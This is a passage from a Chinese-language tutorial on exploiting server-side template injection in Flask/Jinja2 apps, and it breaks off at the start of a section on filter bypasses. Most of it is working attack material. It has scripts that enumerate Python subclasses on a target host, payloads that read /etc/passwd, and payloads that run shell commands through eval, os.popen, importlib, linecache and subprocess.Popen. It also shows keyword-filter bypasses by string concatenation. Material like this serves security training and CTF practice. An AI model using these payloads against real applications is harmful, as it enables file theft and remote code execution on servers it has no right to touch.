<p><code>__globals__</code>：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。</p>
<p><code>__import__()</code>：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 <code>__import__()</code> 来动态载入，就是 <code>import</code>。语法：<code>__import__(模块名)</code></p>
<p>这样我们在进行SSTI注入的时候就可以通过这种方式使用很多的类和方法，通过子类再去获取子类的子类、更多的方法，找出可以利用的类和方法加以利用。总之，是通过python的对象的继承来一步步实现文件读取和命令执行的：</p>
<div class="highlight"><pre><span></span><span class="err">找到父类</span><span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'object'</span><span class="o">&gt;</span> <span class="o">---&gt;</span> <span class="err">寻找子类</span> <span class="o">---&gt;</span> <span class="err">找关于命令执行或者文件操作的模块。</span>
</pre></div>
<p>但是遇上一个SSTI的题，该如何下手？大体上有以下几种思路，简单介绍一下，后续有详细总结。</p>
<ul>
<li>查配置文件</li>
<li>命令执行（其实就是沙盒逃逸类题目的利用方式）</li>
<li>文件读取</li>
</ul>
<h2 id="toc-1">利用 SSTI 读取文件</h2>
<h3 id="toc-2">Python 2</h3>
<p>在上文中我们使用 <code>__subclasses__</code> 方法查看子类的时候，发现可以发现索引号为40指向file类：</p>
<div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()):</span> <span class="k">print</span> <span class="n">i</span>
<span class="o">.....</span>
<span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'type'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'weakref'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'weakcallableproxy'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'weakproxy'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'int'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'basestring'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'bytearray'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'list'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'NoneType'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'NotImplementedType'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'traceback'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'super'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'xrange'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">13</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'dict'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'set'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'slice'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'staticmethod'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">17</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'complex'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">18</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'float'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="o">......</span>
<span class="p">(</span><span class="mi">38</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'ellipsis'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">39</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'member_descriptor'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">40</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'file'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">41</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'PyCapsule'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">42</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'cell'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="p">(</span><span class="mi">43</span><span class="p">,</span> <span class="o">&lt;</span><span class="nb">type</span> <span class="s1">'callable-iterator'</span><span class="o">&gt;</span><span class="p">)</span>
<span class="o">......</span>
</pre></div>
<p>此file类可以直接用来读取文件：</p>
<div class="highlight"><pre><span></span><span class="p">{{[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">'/etc/passwd'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<h3 id="toc-3">Python 3</h3>
<p>使用file类读取文件的方法仅限于Python 2环境，在Python 3环境中file类已经没有了。我们可以用<code>&lt;class '_frozen_importlib_external.FileLoader'&gt;</code> 这个类去读取文件。</p>
<p>首先编写脚本遍历目标Python环境中 <code>&lt;class '_frozen_importlib_external.FileLoader'&gt;</code> 这个类索引号：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"]}}"</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">'FileLoader'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># 得到编号为79</span>
</pre></div>
<p>所以payload如下：</p>

<pre><code>{{().__class__.__bases__[0].__subclasses__()[79]["get_data"](0, "/etc/passwd")}}</code></pre>
<p><a id="img1" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174654-236f65ba-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174654-236f65ba-bd3e-1.png"></a></p>
<h2 id="toc-4">利用 SSTI 执行命令</h2>
<p>可以用来执行命令的类有很多，其基本原理就是遍历含有eval函数即os模块的子类，利用这些子类中的eval函数即os模块执行命令。这里我们简单挑几个常用的讲解。</p>
<h3 id="toc-5">寻找内建函数 eval 执行命令</h3>
<p>首先编写脚本遍历目标Python环境中含有内建函数 eval 的子类的索引号：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"].__init__.__globals__['__builtins__']}}"</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">'eval'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># 得到一大堆子类的索引:</span>
<span class="mi">64</span>
<span class="mi">65</span>
<span class="mi">66</span>
<span class="mi">67</span>
<span class="mi">68</span>
<span class="mi">79</span>
<span class="mi">80</span>
<span class="mi">81</span>
<span class="mi">83</span>
<span class="mi">91</span>
<span class="mi">92</span>
<span class="mi">93</span>
<span class="mi">94</span>
<span class="mi">95</span>
<span class="mi">96</span>
<span class="mi">117</span>
<span class="o">...</span>
</pre></div>
<p>我们可以记下几个含有eval函数的类：</p>
<ul>
<li>warnings.catch_warnings</li>
<li>WarningMessage</li>
<li>codecs.IncrementalEncoder</li>
<li>codecs.IncrementalDecoder</li>
<li>codecs.StreamReaderWriter</li>
<li>os._wrap_close</li>
<li>reprlib.Repr</li>
<li>weakref.finalize</li>
<li>......</li>
</ul>
<p>所以payload如下：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">166</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>
</pre></div>
<p><a id="img2" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174655-2436b6ce-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174655-2436b6ce-bd3e-1.png"></a></p>
<p>我们可以看到，使用eval函数执行命令也是调用的os模块，那我们直接调用os模块不是更简单？</p>
<h3 id="toc-6">寻找 os 模块执行命令</h3>
<p>Python的 os 模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。</p>
<p>首先编写脚本遍历目标Python环境中含有os模块的类的索引号：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"].__init__.__globals__}}"</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">'os.py'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># 可以得到一大堆类</span>
<span class="mi">64</span>
<span class="mi">65</span>
<span class="mi">66</span>
<span class="mi">67</span>
<span class="mi">68</span>
<span class="mi">79</span>
<span class="mi">80</span>
<span class="mi">81</span>
<span class="mi">83</span>
<span class="mi">117</span>
<span class="mi">147</span>
<span class="mi">154</span>
<span class="mi">161</span>
<span class="mi">162</span>
<span class="mi">163</span>
<span class="mi">164</span>
<span class="o">...</span>
</pre></div>
<p>随便挑一个类构造payload执行命令即可：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">79</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p>但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。</p>
<p>我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 <code>os._wrap_close</code>，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。</p>
<h3 id="toc-7">寻找 popen 函数执行命令</h3>
<p>首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"].__init__.__globals__}}"</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">'popen'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># 得到编号为117</span>
</pre></div>
<p>直接构造payload即可：</p>
<div class="highlight"><pre><span></span><span class="p">{{</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">117</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p><a id="img3" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174656-249c2ca2-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174656-249c2ca2-bd3e-1.png"></a></p>
<p>这样得到的索引还是很准确的。</p>
<p>除了这种方法外，我们还可以直接导入os模块，python有一个importlib类，可用load_module来导入你需要的模块。</p>
<h3 id="toc-8">寻找 importlib 类执行命令</h3>
<p>Python 中存在 <code>&lt;class '_frozen_importlib.BuiltinImporter'&gt;</code> 类，目的就是提供 Python 中 import 语句的实现（以及 <code>__import__</code> 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。</p>
<p>首先编写脚本遍历目标Python环境中 importlib 类的索引号：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"]}}"</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">'_frozen_importlib.BuiltinImporter'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># 得到编号为69</span>
</pre></div>
<p>构造如下payload即可执行命令：</p>
<div class="highlight"><pre><span></span><span class="p">{{[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">69</span><span class="p">][</span><span class="s2">"load_module"</span><span class="p">](</span><span class="s2">"os"</span><span class="p">)[</span><span class="s2">"popen"</span><span class="p">](</span><span class="s2">"ls /"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p><a id="img4" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174657-2573bb86-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174657-2573bb86-bd3e-1.png"></a></p>
<h3 id="toc-9">寻找 linecache 函数执行命令</h3>
<p>linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。</p>
<p>首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"].__init__.__globals__}}"</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">'linecache'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># 得到一堆子类的索引:</span>
<span class="mi">168</span>
<span class="mi">169</span>
<span class="mi">203</span>
<span class="mi">206</span>
<span class="mi">207</span>
<span class="mi">208</span>
<span class="o">...</span>
</pre></div>
<p>随便挑一个子类构造payload即可：</p>
<div class="highlight"><pre><span></span><span class="p">{{[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">168</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'linecache'</span><span class="p">][</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>

<span class="p">{{[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">168</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">linecache</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p><a id="img5" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174659-26292458-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174659-26292458-bd3e-1.png"></a></p>
<h3 id="toc-10">寻找 subprocess.Popen 类执行命令</h3>
<p>从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。</p>
<p>subprocess 意在替代其他几个老的模块或者函数，比如：<code>os.system</code>、<code>os.popen</code> 等函数。</p>
<p>首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span>
<span class="p">}</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"]}}"</span>

    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">if</span> <span class="s1">'linecache'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># 得到索引为245</span>
</pre></div>
<p>则构造如下payload执行命令即可：</p>
<div class="highlight"><pre><span></span><span class="p">{{[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">245</span><span class="p">](</span><span class="s1">'ls /'</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span><span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">communicate</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()}}</span>

<span class="c1"># {{[].__class__.__base__.__subclasses__()[245]('要执行的命令',shell=True,stdout=-1).communicate()[0].strip()}}</span>
</pre></div>
<p><a id="img6" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174659-268a5d54-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174659-268a5d54-bd3e-1.png"></a></p>
<h1>Flask-jinja2 SSTI Bypass姿势</h1>
<h2 id="toc-11">关键字绕过</h2>
<h3 id="toc-12">利用字符串拼接绕过</h3>
<p>我们可以利用“+”进行字符串拼接，绕过关键字过滤，例如：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">'/fl'</span><span class="o">+</span><span class="s1">'ag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s1">'__import__("o"+"s").popen("ls /").read()'</span><span class="p">)}}</span>

<span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__buil'</span><span class="o">+</span><span class="s1">'tins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>
</pre></div>
<p>只要返回的是<strong>字典类型</strong>的或是<strong>字符串格式</strong>的，即payload中引号内的，在调用的时候都可以使用字符串拼接绕过。</p>
<h3 id="toc-13">利用编码绕过</h3>
<p>我们可以利用对关键字编码的方法，绕过关键字过滤，例如用base64编码绕过：</p>
